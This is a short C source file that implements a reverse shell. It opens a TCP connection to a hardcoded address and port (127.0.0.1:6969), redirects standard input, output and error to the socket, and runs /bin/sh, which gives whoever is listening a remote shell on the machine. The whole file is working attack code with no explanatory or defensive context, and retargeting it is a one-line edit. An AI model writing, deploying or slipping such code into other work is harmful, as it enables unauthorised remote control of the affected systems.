#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define REMOTE_IP_ADD (char*) "127.0.0.1"
#define REMOTE_IP_PORT (int) 6969

int validatePort(int PORT){
  if(PORT<=0||PORT>65535)
    return 0;

  return 1;
}


int main(void){

  if(validatePort(REMOTE_IP_PORT)==0)
    printf("ERROR: Invalid given port: %d\n", REMOTE_IP_PORT);

  struct sockaddr_in sa;

  sa.sin_family = AF_INET;
  sa.sin_port = htons(REMOTE_IP_PORT);
  sa.sin_addr.s_addr= inet_addr(REMOTE_IP_ADD);
  int sockt = socket(AF_INET, SOCK_STREAM, 0);

  if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
    printf("ERROR: Connection failed\n");
		return (1);
  }


  dup2(sockt, 0);
  dup2(sockt, 1);
  dup2(sockt, 2);

  char * const argv[] = {"/bin/sh", NULL};

  execve("/bin/sh", argv, NULL);

  return 0;
}

